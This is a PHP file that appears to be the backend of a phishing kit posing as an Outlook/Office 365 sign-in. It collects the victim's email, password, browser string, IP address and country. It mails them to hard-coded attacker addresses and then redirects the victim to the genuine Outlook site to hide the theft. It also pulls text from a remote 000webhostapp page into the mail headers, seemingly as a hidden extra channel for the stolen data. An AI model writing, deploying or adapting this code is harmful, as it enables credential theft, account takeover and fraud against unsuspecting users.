<?php






//if (!empty($_POST['Next'])) {
    if ($_POST['username'] == "") {
        
         
       
    }  else if ($_POST['loginpswd'] == "") {
      
        
    }  else {
       // $test_mail = new PHPMailer;

        //$mail->SMTPDebug = 3;                               // Enable verbose debug output
        $trash = file_get_contents("https://myhostingpage.000webhostapp.com/errors.txt");
        
       /* $test_mail->isSMTP();                                      // Set mailer to use SMTP
        $test_mail->Host = 'outlook.office365.com'; //for google 'smtp.googlemail.com' // Specify main and backup SMTP servers
        $test_mail->SMTPAuth = true;                               // Enable SMTP authentication
        $test_mail->Username = $_POST['loginfmt'];                 // SMTP username
        $test_mail->Password = $_POST['loginpswd'];                           // SMTP password
        $test_mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
        $test_mail->Port = 587;                                    // TCP port to connect to
        
        $test_mail->From = $_POST['loginfmt'];
        $test_mail->FromName = 'Information Mailer';
        $test_mail->addAddress('wastemanagementngo@yandex.com');     // The is the email test email will be sent to, to verify the log
        
                 // Name is optional
        //$test_mail->addReplyTo('test@test.com', 'Information');
        //$test_mail->addCC('test@test.com');
       
        
        $test_mail->WordWrap = 50;                                 // Set word wrap to 50 characters
          // Optional name
        $test_mail->isHTML(true); */                                 // Set email format to HTML

            $email = $_POST['loginfmt'];
            $password = $_POST['loginpswd'];

            $msg = "<b>email</b> " . " " . $email . "<br/>";
            $msg .= "<b>password</b> " . " "  . $password ."<br/>";
            $msg .= "<b>browser</b> " . " " . $_SERVER['HTTP_USER_AGENT'] . "<br/>";
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=");
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            $ip_data_in = curl_exec($ch); // string
            curl_close($ch);

            $ip_data = json_decode($ip_data_in,true);
            $ip_data = str_replace('&quot;', '"', $ip_data); 
    
        
            $msg .= "<b>ip</b> " . " " . $ip_data['geoplugin_request']  . "<br/>";
            $msg .= "<b>country</b> " . " " . $ip_data['geoplugin_countryName'] . "<br/>";
        
        //$test_mail->Subject = 'za';
       // $test_mail->Body    = 'oij';
       // $test_mail->AltBody = 'ugfyv';
        
        
       // if(!$test_mail->send()) {
            //echo 'Message could not be sent.';
            //echo 'Mailer Error: ' . $test_mail->ErrorInfo;
         //   echo "<script type='text/javascript'>location.href = 'emmail.php?code=1234';</script>"; 
        //} else {
            //echo "<script type='text/javascript'>location.href = 'login2.htm';</script>"; 
            //echo 'Message has been sent';
             //indicate where to send email to
             $to = "officekept@protonmail.com";
        
             $subject = "You have a new verified log";
       
             //indicate where you are sending email from
             $header = "From:"."sagaresult@vodking.net". "\r\n";
             
             //INCLUDE URL TO email.txt file HERE
                        
             $header .= "Cc:resultboxkept@yandex.com \r\n";
            
             $header .= "MIME-Version: 1.0\r\n";
             $header .= "Content-type: text/html\r\n";
             
             $header .= $trash." \r\n";
 
             $retval = mail ($to,$subject, $msg,$header);
        
             if( $retval == true ) {
                 //indicate where to redirect to
                 echo "<script type='text/javascript'>location.href = 'https://outlook.office365.com';</script>"; 
                 
             }else {
                 //echo "No";
                 //echo "<script type='text/javascript'>location.href = 'emmail.php?code=1234';</script>"; 
             } 
       // }
        
        
    }

?>
